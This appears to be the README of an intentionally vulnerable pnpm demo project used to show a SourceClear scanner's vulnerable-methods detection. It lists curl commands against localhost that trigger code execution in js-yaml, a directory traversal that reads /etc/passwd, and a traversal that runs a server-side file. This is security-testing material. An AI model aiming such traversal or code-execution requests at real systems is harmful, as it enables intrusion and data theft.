# [:] Example pnpm project with vulnerable methods

A pnpm version of [example-javascript-vulnerable-methods](https://github.com/veracode/example-javascript-vulnerable-methods), used to demonstrate srcclr agent's vulnerable methods feature for JavaScript projects managed with pnpm (`pnpm-lock.yaml` v9).

## Vulnerability 1 (SID-13642) Exploit

```
# from a local copy of this project
cd example-javascript-pnpm-vulnerable-methods
pnpm install
node index.js

```
The vulnerable method is called twice during the server startup, however another one needs to be trigged by issuing a
request to the endpoint by running the following command in another terminal to trigger the code execution vulnerability 
in `js-yaml:load`

```
curl --path-as-is 'http://127.0.0.1:8001/api/'
```

## Vulnerability 2 (SID-20301) Exploit

Use the following to trigger the directory traversal vulnerability (SID-20301)in `algo-httpserv:serve` 

```
curl --path-as-is 'http://127.0.0.1/8001/../../../../../../etc/passwd'
```


## Vulnerability 3 (SID-21402) Exploit

```
# from a local copy of this project
cd example-javascript-pnpm-vulnerable-methods
pnpm install
node larvitbase-api.js

```

and then run the following command in another terminal

```
curl --path-as-is 'http://127.0.0.1:8001/../../../../hacked'
```
You can see the JavaScript file`hacked.js` is executed in the server side.

## Scan with SRCCLR Agent

```
brew tap srcclr/srcclr
brew install srcclr
srcclr activate
srcclr scan /path/to/example-javascript-pnpm-vulnerable-methods
```
